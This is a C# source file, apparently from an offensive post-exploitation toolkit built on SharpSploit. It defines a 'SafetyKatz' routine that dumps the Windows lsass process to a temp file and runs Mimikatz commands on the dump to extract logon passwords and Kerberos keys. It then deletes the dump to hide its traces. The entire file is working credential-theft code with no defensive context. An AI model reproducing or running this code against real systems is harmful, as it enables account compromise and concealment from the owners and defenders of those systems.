using System;
using System.IO;

using SharpSploit.Enumeration;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class SafetyKatz
    {
        public static string Execute()
        {
            string output = "";
            try
            {
                Random random = new Random();
                string path = "C:\\WINDOWS\\Temp";
                string file = "debug" + random.Next(999, 9999).ToString() + ".bin";
                string fullpath = path + "\\" + file;
                Host.CreateProcessDump("lsass", path, file);
                output += SharpSploit.Credentials.Mimikatz.Command("\"sekurlsa::minidump " + fullpath + "\" \"privilege::debug\" \"sekurlsa::logonpasswords full\" \"sekurlsa::ekeys\" \"exit\"");
                File.Delete(fullpath);
            }
            catch (Exception e) { output += e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
            return output;
        }
    }
}